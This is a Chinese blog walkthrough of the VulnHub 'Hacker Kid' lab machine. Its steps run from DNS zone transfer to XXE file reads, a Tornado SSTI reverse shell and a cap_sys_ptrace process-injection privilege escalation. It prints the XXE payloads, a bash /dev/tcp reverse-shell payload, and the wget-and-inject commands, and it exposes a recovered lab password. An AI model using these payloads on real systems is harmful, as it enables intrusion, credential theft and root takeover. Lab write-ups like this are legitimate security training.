@@ -1,0 +1,397 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulnhub靶场之HACKER KID: 1.0.1 | 休比大王</title><meta name="author" content="xiubi"><meta name="copyright" content="xiubi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="故人围故城 中有哀声可知晓 血肉捱饥寒 四时尽萧条">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶场之HACKER KID: 1.0.1">
+<meta property="og:url" content="https://xiubi1125.github.io/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/index.html">
+<meta property="og:site_name" content="休比大王">
+<meta property="og:description" content="故人围故城 中有哀声可知晓 血肉捱饥寒 四时尽萧条">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiubi1125.github.io/img/hacker.jpg">
+<meta property="article:published_time" content="2025-10-23T00:59:51.526Z">
+<meta property="article:modified_time" content="2025-10-24T01:21:35.491Z">
+<meta property="article:author" content="xiubi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiubi1125.github.io/img/hacker.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "vulnhub靶场之HACKER KID: 1.0.1",
+  "url": "https://xiubi1125.github.io/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/",
+  "image": "https://xiubi1125.github.io/img/hacker.jpg",
+  "datePublished": "2025-10-23T00:59:51.526Z",
+  "dateModified": "2025-10-24T01:21:35.491Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xiubi",
+      "url": "https://xiubi1125.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/dancing.png"><link rel="canonical" href="https://xiubi1125.github.io/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub靶场之HACKER KID: 1.0.1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/1.css"><link rel="stylesheet" href="/css/2.css"><link rel="stylesheet" href="/css/3.css"><link rel="stylesheet" href="/css/4.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-categories-card/lib/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="休比大王" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/qz.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/hacker.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/dancing.png" alt="Logo"><span class="site-name">休比大王</span></a><a class="nav-page-title" href="/"><span class="site-name">vulnhub靶场之HACKER KID: 1.0.1</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶场之HACKER KID: 1.0.1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-23T00:59:51.526Z" title="发表于 2025-10-23 08:59:51">2025-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-24T01:21:35.491Z" title="更新于 2025-10-24 09:21:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">靶场系列</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/hacker.jpg);"></div><article class="container post-content" id="article-container"><h1 id="vulnhub靶场之HACKER-KID-1-0-1"><a href="#vulnhub靶场之HACKER-KID-1-0-1" class="headerlink" title="vulnhub靶场之HACKER KID: 1.0.1"></a>vulnhub靶场之HACKER KID: 1.0.1</h1><blockquote>
+<p>靶机：Hacker kid: 1.0.1，下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a></p>
+<p>考点：xxe漏洞、dns解析、ssti漏洞、cap_sys_ptrace+ep进程注入提权。</p>
+</blockquote>
+<p>靶机登录</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023090054830.png" alt="image-20251023090054681"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023161841561.png"></p>
+<p>发现需要密码</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023161920573.png" alt="image-20251023161920490"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023161936011.png" alt="image-20251023161935946"></p>
+<p>开放了 53(DNS服务)，80(HTTP apache服务) ， 9999（HTTP <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=tornado&amp;spm=1001.2101.3001.7020">tornado</a>服务）</p>
+<p>tornado为python的web框架。</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023163503728.png" alt="image-20251023163503646"></p>
+<p>在靶场场景中，80 端口的 Apache 可能提供常规网页（如登录页、静态内容），而 9999 端口的 Tornado 可能运行着需要异步处理的功能（如 API 接口、实时交互页面），两者可能对应不同的漏洞点（如 Apache 的配置漏洞、Tornado 的代码逻辑漏洞等），需分别探测分析。</p>
+<p>如果想查看详细信息可以用这个</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p- -T4 192.168.23.134</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023162206092.png" alt="image-20251023162205944"></p>
+<p>同时进行目录扫描</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023162244218.png" alt="image-20251023162243930"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023162409497.png" alt="image-20251023162409282"></p>
+<p>80端口网页访问目录没看到什么比较有用的</p>
+<p>不过查看源代码可以发现有提示信息</p>
+<ul>
+<li>注释内容：<code>TO DO: Use a GET parameter page_no to view pages.</code>，明确提示需要用 <code>page_no</code> 这个 GET 参数来访问更多分页（例如 <code>?page_no=1</code> <code>?page_no=2</code>）。</li>
+</ul>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023163818808.png"></p>
+<p>介里</p>
+<p>我们get传参进去</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023163936854.png" alt="image-20251023163936701"></p>
+<p>返回了信息</p>
+<p>不知道是不是sql注入</p>
+<p>找个字典爆破一下试试</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023164622254.png" alt="image-20251023164622093"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023164628963.png" alt="image-20251023164628868"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023164720934.png" alt="image-20251023164720780"></p>
+<p>失败了</p>
+<p>再尝试一些其他的数字</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023164754572.png" alt="image-20251023164754485"></p>
+<p>发现21的时候返回不同</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023164819497.png" alt="image-20251023164819320"></p>
+<p>Okay so you want me to speak something ?<br>I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!<br data-tomark-pass="">Out of my many homes…one such home..one such home for me : hackers.blackhat.local<br>大概意思就是</p>
+<p>“怎么，你是想让我说点什么？</p>
+<p>我可是个黑客小孩，又不是笨蛋黑客。所以我建了些子域名，方便我随时回到这台服务器上！</p>
+<p>在我众多‘窝点’里…… 有这么一个‘窝’，专门给我留的：hackers.blackhat.local”</p>
+<p>（怎么豆包翻译的这么抽象 )</p>
+<p>hackers.blackhat.local这个是他的域名</p>
+<p>我们尝试使用dig挖掘域名信息</p>
+<h2 id="dig信息收集"><a href="#dig信息收集" class="headerlink" title="dig信息收集"></a>dig信息收集</h2><h3 id="1-修改-Kali-的-hosts-文件，添加子域名映射"><a href="#1-修改-Kali-的-hosts-文件，添加子域名映射" class="headerlink" title="1.修改 Kali 的 hosts 文件，添加子域名映射"></a>1.修改 Kali 的 hosts 文件，添加子域名映射</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/hosts</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023171627184.png" alt="image-20251023171626810"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.23.134  hackers.blackhat.local</span><br></pre></td></tr></tbody></table></figure>
+
+<p>刷新dns缓存</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nscd -i hosts</span><br></pre></td></tr></tbody></table></figure>
+
+<p>打开域名</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackers.blackhat.local/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023173242076.png" alt="image-20251023173241472"></p>
+<p>尽量在虚拟机浏览器打开</p>
+<p>反正我这里主机的浏览器打不开这个域名</p>
+<p>这里利用到的是DNS 区域传输漏洞</p>
+<h3 id="DNS-区域传输漏洞"><a href="#DNS-区域传输漏洞" class="headerlink" title="DNS 区域传输漏洞"></a>DNS 区域传输漏洞</h3><p>DNS 区域传输（AXFR）是 DNS 服务器之间同步域名解析记录的机制。正常情况下，只有授权的 DNS 服务器才能请求区域传输。但如果 DNS 服务器配置不当，<strong>任何主机都能发起 AXFR 请求并获取整个区域的所有解析记录</strong>，这就形成了区域传输漏洞。攻击者可通过该漏洞枚举所有子域名、IP 映射等敏感信息，为后续渗透提供攻击面。</p>
+<p>利⽤dns的区域传输漏洞查看dns记录,探测到新的域名</p>
+<blockquote>
+<p>axfr 是q-type类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送 某个区域的全部记录。我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.23.134 -t axfr blackhat.local</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023173639352.png" alt="image-20251023173639053"></p>
+<p>发现有一个子域 <code>hackerkid.blackhat.local</code>，将该子域也添加进 hosts 文件里</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023174349512.png" alt="image-20251023174348150"></p>
+<p>新的页面</p>
+<p>查看源代码</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023174731485.png" alt="image-20251023174731149"></p>
+<p>发现可利用的漏洞点(xxe)</p>
+<p>抓包尝试利用</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023175952953.png" alt="image-20251023175951757"></p>
+<p>很明显的xml格式</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">ohh</span> <span class="keyword">SYSTEM</span> <span class="string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>1<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">tel</span>&gt;</span>1<span class="tag">&lt;/<span class="name">tel</span>&gt;</span><span class="tag">&lt;<span class="name">email</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;ohh;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">email</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023182243769.png" alt="image-20251023182243251"></p>
+<p>带出passwd</p>
+<blockquote>
+<p><code>/etc/passwd</code>每行代表一个用户，格式为 “<code>用户名:密码占位符:UID:GID:描述:家目录:登录shell</code>”</p>
+</blockquote>
+<p>筛选了只有两个用户 具有 /bin/bash</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023182700036.png" alt="image-20251023182659967"></p>
+<p>读取 saket home目录下的 .bashrc 文件</p>
+<p>用filter伪协议</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">ohh</span> <span class="keyword">SYSTEM</span> <span class="string">"php://filter/convert.base64-encode/resource=/home/saket/.bashrc"</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>ohh<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">tel</span>&gt;</span>1<span class="tag">&lt;/<span class="name">tel</span>&gt;</span><span class="tag">&lt;<span class="name">email</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;ohh;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">email</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023183032137.png" alt="image-20251023183031882"></p>
+<p>解码得到</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># enable programmable completion features (you don't need to enable</span><br><span class="line"># this, if it's already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="line"># sources /etc/bash.bashrc).</span><br><span class="line">if ! shopt -oq posix; then</span><br><span class="line">  if [ -f /usr/share/bash-completion/bash_completion ]; then</span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  elif [ -f /etc/bash_completion ]; then</span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">#Setting Password for running python app</span><br><span class="line">username="admin"</span><br><span class="line">password="Saket!#$%@!!"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>拿到账号密码</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023183324763.png" alt="image-20251023183324716"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023183749083.png" alt="image-20251023183748935"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023183805767.png" alt="image-20251023183805651"></p>
+<p>。。。。。账号要换成saket</p>
+<p>页面告诉我们tell me your name.</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023184113752.png"></p>
+<p>尝试传参发现回显回来是我们的输入</p>
+<p>考虑ssti</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023184157205.png" alt="image-20251023184157087"></p>
+<p>存在ssti漏洞</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023205230027.png" alt="image-20251023205229812"></p>
+<p>试了一下用fenjing一把梭</p>
+<p>但是没能成功</p>
+<p>回到手注（注意目标使用的是<strong>Tornado 模板引擎</strong>而不是jinja2）</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023205608254.png" alt="image-20251023205608055"></p>
+<p>列出根目录信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name={{__import__('os').popen('ls /').read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>下意识想去找flag了</p>
+<p>但在靶机里面我们要的是shell</p>
+<p>所以这里下一步尝试反弹shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></tbody></table></figure>
+
+<p>开始监听1234端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name={{__import__('os').system('bash -c "bash -i &gt;&amp; /dev/tcp/192.168.23.129/1234 0&gt;&amp;1"')}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>记得要url编码一下</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name={{__import__(<span class="string">'os'</span>).system(<span class="string">'bash%20-c%20"bash%20-i%20%3E%26%20/dev/tcp/192.168.23.129/1234%200%3E%261"'</span>)}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023210335079.png" alt="image-20251023210334816"></p>
+<p>成功getshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<p>考点：Capabilitie 提权</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html">Linux提权之：利用capabilities提权 - f_carey - 博客园</a></p>
+<p>Linux 的 Capabilities 将 root 权限拆分为细粒度的权限集合（如<code>CAP_NET_RAW</code>允许创建原始套接字、<code>CAP_SYS_ADMIN</code>包含系统管理权限等）。若某个程序被错误配置了高权限 Capabilities（如<code>cap_setuid+ep</code>），普通用户可通过该程序提权。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null   </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023210924623.png" alt="image-20251023210924520"></p>
+<p>系统中存在一个可利用的 Capabilities 配置：<code>/usr/bin/python2.7 = cap_sys_ptrace+ep</code>，可通过<code>ptrace</code>权限实现提权</p>
+<p>(<code>/usr/bin/python2.7 = cap_sys_ptrace+ep</code> 之所以可被利用，核心原因是 <code>cap_sys_ptrace</code> 权限赋予了 <code>python2.7</code> 调试系统中<strong>任意进程（包括 root 进程）</strong> 的能力，而这种权限可以被滥用为提权通道)</p>
+<h3 id="具体利用逻辑（提权流程）"><a href="#具体利用逻辑（提权流程）" class="headerlink" title="具体利用逻辑（提权流程）"></a>具体利用逻辑（提权流程）</h3><p><strong>找到一个运行中的 root 进程</strong>（如 <code>systemd</code>、<code>sshd</code>、<code>crond</code> 等，这些进程始终以 root 权限运行）。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep root | grep -v grep | grep -v '\[' | awk '{print $2 "\t" $8}'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们选择这个进程继续</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251023211442514.png" alt="image-20251023211442378"></p>
+<p>复制个脚本</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/15185591.html">python Capabilities cap_sys_ptrace+ep提权 - 隐念笎 - 博客园</a></p>
+<p>靶机导入脚本</p>
+<p>折腾了好久</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机先把 inject.py 文件下载好，然后使用python开启http服务端口</span><br><span class="line">python -m http.server 8000</span><br><span class="line"># 靶机下载、给执行权限、注入root进程</span><br><span class="line">wget http://192.168.23.129:8000/inject.py</span><br><span class="line">chmod +x inject.py</span><br><span class="line">/usr/bin/python2.7 inject.py 727</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251024084003730.png" alt="image-20251024084003270"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.23.129 5600</span><br></pre></td></tr></tbody></table></figure>
+
+
+
